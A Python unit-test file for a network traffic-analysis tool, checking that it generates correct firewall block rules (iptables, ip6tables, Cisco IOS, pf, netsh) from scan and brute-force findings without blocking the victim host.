class TestAclGen(unittest.TestCase):
    def test_iptables_rules_from_scan_finding(self):
        result = trafkit.analyze(_p("nmap_connect"))
        out = generate_acl(result.findings, "iptables", min_severity="medium")
        self.assertIn("192.168.1.50", out)
        self.assertIn("iptables -A INPUT -s 192.168.1.50 -j DROP", out)

    def test_never_blocks_the_victim(self):
        result = trafkit.analyze(_p("nmap_connect"))
        out = generate_acl(result.findings, "iptables", min_severity="medium")
        self.assertNotIn("192.168.1.10", out)  # the scanned host, not the scanner

    def test_all_targets_produce_output(self):
        result = trafkit.analyze(_p("ftp_bruteforce"))
        for target in ("iptables", "cisco_ios", "pf", "netsh"):
            out = generate_acl(result.findings, target, min_severity="medium")
            self.assertTrue(out.strip())

    def test_no_findings_above_threshold_is_explicit(self):
        out = generate_acl([], "iptables", min_severity="high")
        self.assertIn("No iptables rules generated", out)

    def test_cisco_acl_does_not_end_in_implicit_deny(self):
        from trafkit.models import Finding
        f = Finding(rule_id="X", title="x", severity="high", confidence="high", description="",
                    evidence={"src": "198.51.100.7"})
        out = generate_acl([f], "cisco_ios")
        self.assertIn("deny ip host 198.51.100.7 any", out)
        self.assertIn("permit ip any any", out)       # otherwise the interface drops everything

    def test_ipv6_attackers_get_ip6tables_rules(self):
        from trafkit.models import Finding
        f = Finding(rule_id="X", title="x", severity="high", confidence="high", description="",
                    evidence={"src": "2001:db8::66"})
        self.assertIn("ip6tables -A INPUT -s 2001:db8::66 -j DROP", generate_acl([f], "iptables"))


